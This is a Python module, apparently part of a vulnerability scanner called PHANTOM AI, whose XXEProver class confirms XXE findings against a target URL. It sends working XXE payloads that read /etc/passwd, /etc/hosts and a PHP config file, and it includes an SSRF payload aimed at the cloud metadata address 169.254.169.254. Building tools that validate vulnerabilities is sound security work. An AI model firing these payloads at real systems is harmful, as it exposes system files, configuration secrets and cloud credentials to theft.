"""
PHANTOM AI - XXE Prover

Proves XXE impact: can read files, SSRF, potentially RCE.
Extracted from scanning/exploit_proof_engine.py.
"""

from __future__ import annotations

from scanning.proof_engine.base_prover import BaseProver
from scanning.proof_engine.models import ProofResult

from utils.logger import get_logger

logger = get_logger(__name__)


class XXEProver(BaseProver):
    """Prove XXE impact: can read files, SSRF, potentially RCE."""

    async def prove(self, finding: dict) -> ProofResult:
        result = ProofResult()
        url = finding.get("matched_at", finding.get("host", ""))

        if not url:
            return ProofResult.not_attempted("missing_url")

        # Get original payload that worked
        original_payload = (finding.get("metadata") or {}).get("payload", "")

        # --- Q1: Can I repeat? ---
        if original_payload:
            headers = {"Content-Type": "application/xml"}
            status, body, _ = await self._safe_request("POST", url, data=original_payload, headers=headers)
            if status == 200 and ("root:" in body or "boot.ini" in body.lower()):
                result.can_repeat = True
                result.repeat_count = 1
                self._record_vector_attempt("xxe_repeat", True, "", url)
        else:
            # Try basic XXE
            xxe_payload = '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'''
            headers = {"Content-Type": "application/xml"}
            status, body, _ = await self._safe_request("POST", url, data=xxe_payload, headers=headers)
            if status == 200 and "root:" in body:
                result.can_repeat = True
                self._record_vector_attempt("xxe_repeat", True, "", url)

        # --- Q2: Can I mutate? (different file reads) ---
        if self.budget_remaining > 0 and result.can_repeat:
            xxe_targets = [
                ("passwd", "file:///etc/passwd"),
                ("hosts", "file:///etc/hosts"),
                ("config", "file:///var/www/html/config.php"),
            ]
            for label, target in xxe_targets:
                if self.budget_remaining <= 0:
                    break
                xxe_payload = f'''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{target}">]><root>&xxe;</root>'''
                headers = {"Content-Type": "application/xml"}
                status, body, _ = await self._safe_request("POST", url, data=xxe_payload, headers=headers)
                if status == 200 and len(body) > 50:
                    result.can_mutate = True
                    result.mutations.append(f"{label}: readable via XXE")
                    result.data_extracted.append(f"File content from {target}")
                    result.impact_type = "DATA_LEAK"
                    self._record_vector_attempt(f"xxe_mutate_{label}", True, target, url)

        # --- Q3: Can I escalate? (SSRF via XXE) ---
        if self.budget_remaining > 0 and result.can_repeat:
            xxe_ssrf = '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'''
            headers = {"Content-Type": "application/xml"}
            status, body, _ = await self._safe_request("POST", url, data=xxe_ssrf, headers=headers)
            if status == 200 and ("ami-" in body or "instance-id" in body):
                result.can_escalate = True
                result.escalation = "XXE enables SSRF to cloud metadata"
                result.privilege_gained = "internal_network_access"
                result.impact_type = "PRIVILEGE_ESCALATION"
                self._record_vector_attempt("xxe_escalate_ssrf", True, "", url)

        # --- Q4: Can I chain? ---
        ssrf_findings = self._find_related_findings(["ssrf"])
        if ssrf_findings or result.can_escalate:
            result.can_chain = True
            result.chain_targets.append("XXE + SSRF = internal network pivot")

        result.requests_used = self._requests_used
        return result.finalize()  # FIX P0-005: Calculate proof outcome and impact
